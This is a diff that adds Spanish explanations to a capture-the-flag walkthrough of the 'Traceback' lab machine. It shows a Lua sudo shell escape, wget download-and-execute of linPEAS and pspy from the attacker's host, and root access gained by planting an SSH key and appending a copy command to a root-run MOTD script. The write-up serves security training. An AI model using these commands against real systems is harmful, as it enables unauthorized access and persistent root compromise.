@@ -327,7 +327,7 @@ webadmin@traceback:/var/www/html$ stty rows 46 columns 230
 
 ### Abusing sudoers privilege (Executing Lua Tool with another user)
 
-
+Revisando el directorio personal del usuario `webadmin`, nos encontramos con un archivo de texto llamado `note.txt` el cual indica que el usuario `sysadmin`le ha proporcionado al usuario `webadmin` una herramienta para practicar con el lenguaje de programación `Lua`, además indica que el usuario ya debería saber como encontrarlo.
 
 ```bash
 webadmin@traceback:/home/webadmin$ ls
@@ -339,7 +339,7 @@ I'm sure you know where to find it.
 Contact me if you have any question.
 ```
 
-
+Revisando si el usuario `webadmin` dispone de algún permiso de `sudoers`, nos encontramos en que puede ejecutar como el usuario `sysadmin`el binario de `/home/sysadmin/luvit`, una herramienta para practicar `Lua`.
 
 ```bash
 webadmin@traceback:/home/webadmin$ sudo -l
@@ -350,7 +350,7 @@ User webadmin may run the following commands on traceback:
     (sysadmin) NOPASSWD: /home/sysadmin/luvit
 ```
 
-
+Revisando a través de la herramienta de [`searchbins`](https://github.com/r1vs3c/searchbins) nos encontramos que podemos abusar del lenguaje de programación`Lua`para poder obtener una `shell`, en este caso, una `shell` como el usuario `sysadmin`.
 
 ```bash
 ❯ searchbins -b lua -f sudo
@@ -363,40 +363,47 @@ User webadmin may run the following commands on traceback:
 	| sudo lua -e 'os.execute("/bin/sh")'
 ```
 
-
+A través de este privilegio de `sudoers`sobre el binario indicado, finalmente conseguiremos disponer de una `bash`como el usuario `sysadmin`y podremos visualizar la flag **user.txt**.
 
 ```bash
 webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/bash")'
 sysadmin@traceback:/home/webadmin$ whoami
 sysadmin
 sysadmin@traceback:/home/webadmin$ cat /home/sysadmin/user.txt 
-3f001c3c927acba6c4473813ed726a65
+3f00****************************
 ```
 
 ## Privilege Escalation
 
 ### linPEAS Enumeration
 
+El siguiente paso, será realizar una enumeración con una herramienta automatizada como `linPEAS`, que realiza un escaneo del equipo en busca de vectores para elevar nuestros privilegios.
+
+El binario lo dispondremos en nuestro equipo local y lo compartiremos a través de un servidor web.
+
 ```bash
 ❯ ls -l linpeas.sh
 .rwxrwxr-x kali kali 820 KB Wed Feb 19 08:41:54 2025  linpeas.sh
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+En este máquina, el binario de `cURL`no estaba instalado para realizar un `Fileless Attack` para ejecutar el script que compartimos sin necesidad de descargarlo en el equipo local.
 
+Por dicho motivo, descargaremos el script que estamos compartiendo con `wget` le daremos permisos de ejecución y lo ejecutaremos para que realice la enumeración.
 
 ```bash
 sysadmin@traceback:/tmp$ wget 10.10.14.2/linpeas.sh; chmod +x linpeas.sh; /tmp/linpeas.sh
 ```
 
-
+Al finalizar la enumeración, comprobamos que el usuario actual dispone de privilegios de escritura sobre los siguientes archivos ubicados en `/etc/update.mot.d`, más adelante explicaremos qué son este tipo de archivos y cómo podemos abusar de estos para obtener acceso como `root`.
 
 <figure><img src="../../.gitbook/assets/5384_vmware_ctvwSY4afh.png" alt=""><figcaption></figcaption></figure>
 
 ### Pspy64 Monitorization
 
-
+Por otro lado, también hicimos una comprobación para verificar los procesos que se estaban ejecutando en el equipo víctima. Para ello, utilizaremos el binario de `pspy`el cual compartiremos desde nuestro equipo local mediante un servidor web.
 
 ```bash
 ❯ ls -l pspy64
@@ -406,13 +413,17 @@ sysadmin@traceback:/tmp$ wget 10.10.14.2/linpeas.sh; chmod +x linpeas.sh; /tmp/l
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo víctima, descargaremos el binario con `wget`, le daremos permisos de ejecución y ejecutaremos el binario.
 
 ```bash
 sysadmin@traceback:/tmp$ wget 10.10.14.2/pspy64; chmod +x pspy64; /tmp/pspy64
 ```
 
+Comprobamos que en el equipo víctima, al parecer se está ejecutando una tarea `CRON`
 
+{% hint style="info" %}
+Este proceso está **restableciendo los archivos MOTD** a su estado original cada cierto tiempo. Esto se hace copiando los archivos desde un directorio de respaldo (`/var/backups/.update-motd.d/`) al directorio de MOTD (`/etc/update-motd.d/`).
+{% endhint %}
 
 ```bash
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
@@ -444,7 +455,7 @@ done
 2025/03/06 09:31:01 CMD: UID=0     PID=16750  | sleep 30 
 ```
 
-
+Revisando los procesos a través de `ps aux`que está ejecutando el usuario `root`, nos encontramos que este es el usuario que realiza el restablecimiento de los archivos `MOTD` a su estado original.
 
 ```bash
 sysadmin@traceback:/tmp$ ps aux | grep root
@@ -457,6 +468,14 @@ root      16750  0.0  0.0   7468   740 ?        S    09:31   0:00 sleep 30
 ```
 
 ### Update-Motd Privilege Escalation <a href="#exploit-title" id="exploit-title"></a>
+
+**¿Qué son los archivos en /etc/update-motd.d/?**
+
+{% hint style="info" %}
+Estos archivos son scripts que generan el Mensaje del Día (MOTD), que se muestra cuando un usuario inicia sesión en el sistema. Los scripts se ejecutan en orden numérico (por ejemplo, 00-header, 10-help-text, etc.) y su salida se muestra en la terminal.
+{% endhint %}
+
+Comprobamos que los scripts que se ubican en `/etc/update.motd.d` disponemos de permisos de escritura sobre ellos. Para poder abusar de estos archivos, podemos intentar escribir sobre uno de ellos, por ejemplo `00-header` para indicarle que ejecute otro comando.
 
 ```bash
 sysadmin@traceback:/etc/update-motd.d$ ls -l
@@ -494,7 +513,18 @@ sysadmin@traceback:/etc/update-motd.d$ cat 00-header
 echo "\nWelcome to Xh4H land \n"
 ```
 
+Nuestro objetivo que planteamos es el siguiente:
 
+* Obtener clave pública de atacante para copiarla en `/home/sysadmin/.ssh/authorized_keys` para así poder conectarnos al equipo sin necesidad de saber las credenciales y que se activen los scripts `MOTD`.
+* Editar el archivo principal `MOTD` llamado `00-header` para indicarle que realice una copia de nuestra clave pública ubicada después del primero paso en `/home/sysadmin/.ssh/authorized_keys` a la ubicación de `/root/.ssh/authorized_keys`.
+* Una vez editado el archivo `MOTD`, iniciar sesión con el usuario `sysadmin`mediante `SSH`sin proporcionar credenciales (debido que nuestra clave pública está en las claves autorizadas `SSH`de dicho usuario). Una vez nos conectemos se activarán los scripts de `MOTD`.
+* Nos conectamos con el usuario `root` mediante `SSH` sin proporcionar credenciales. Si todo funciona correctamente, deberíamos de disponer acceso como `root`. Esto debido que cuando hemos iniciado sesión se ha activado el script de `MOTD` y se ha ejecutado el comando anteriormente indciado.
+
+{% hint style="danger" %}
+EL PROCESO SE DEBE REALIZAR DE MANERA RÁPIDA, DEBIDO QUE COMO HEMOS COMPROBADO ANTERIORMENTE, EL USUARIO `ROOT` RESTABLECE LOS ARCHIVOS `MOTD` CADA 30 SEGUNDOS.
+{% endhint %}
+
+Desde nuestra máquina atacante, generaremos una nueva clave `SSH`. Copiaremos el contenido de nuestra clave pública `SSH`generada.
 
 ```bash
 ❯ ssh-keygen
@@ -519,22 +549,18 @@ The key's randomart image is:
 |         + o     |
 |        .        |
 +----[SHA256]-----+
-```
 
-
-
-```bash
 ❯ cat /home/kali/.ssh/id_ed25519.pub
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKu23HUcaRFAHVBfzy2IJTf+jwRyuzxSeg5KFVRuWNqZ kali@kali
 ```
 
-
+Introduciremos nuestra clave pública `SSH` en el archivo `/home/sysadmin/.ssh/authorized_keys`para poder iniciar sesión mediante `SSH` con el usuario `sysadmin` sin proporcionar credenciales.
 
 ```bash
 sysadmin@traceback:/etc/update-motd.d$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKu23HUcaRFAHVBfzy2IJTf+jwRyuzxSeg5KFVRuWNqZ kali@kali' > /home/sysadmin/.ssh/authorized_keys
 ```
 
-
+Verificamos que efectivamente podemos autenticarnos al `SSH` con dicho usuario sin proporcionar credenciales válidas.
 
 ```bash
 ❯ ssh sysadmin@10.10.10.181
@@ -557,13 +583,13 @@ $ whoami
 sysadmin
 ```
 
-
+El siguiente paso será sobreescribir el script `MOTD` llamado `00-header` para indicarle que haga una copia de nuestra clave pública ubicada en `/home/sysadmin/.ssh/authorized_keys` hacia `/root/.ssh`, así el usuario `root`, dispondrá de un archivo llamado `authorized_keys` con nuestra clave pública y podremos conectarnos sin proporcionar credenciales.
 
 ```bash
 sysadmin@traceback:/etc/update-motd.d$ echo 'cp /home/sysadmin/.ssh/authorized_keys /root/.ssh/' >> 00-header
 ```
 
-
+Para que se activen los scripts `MOTD`, rápidamente deberemos iniciar sesión mediante `SSH` con el usuario `sysadmin`.
 
 ```bash
 ❯ ssh sysadmin@10.10.10.181
@@ -583,7 +609,9 @@ $ whoami
 sysadmin
 ```
 
+Al iniciar sesión con dicho usuario, se debería haber activado los scripts `MOTD` y como tal, nuestra clave pública `SSH`se encontraría en `/root/.ssh/authorized_keys` con lo cual podríamos autenticarnos al `SSH` con el usuario `root` sin proporcionar credenciales.
 
+Verificamos que finalmente podemos acceder al equipo con el usuario`root` sin proporcionar credenciales de acceso. Finalmente logramos visualizar la flag **root.txt**.
 
 ```bash
 ❯ ssh root@10.10.10.181
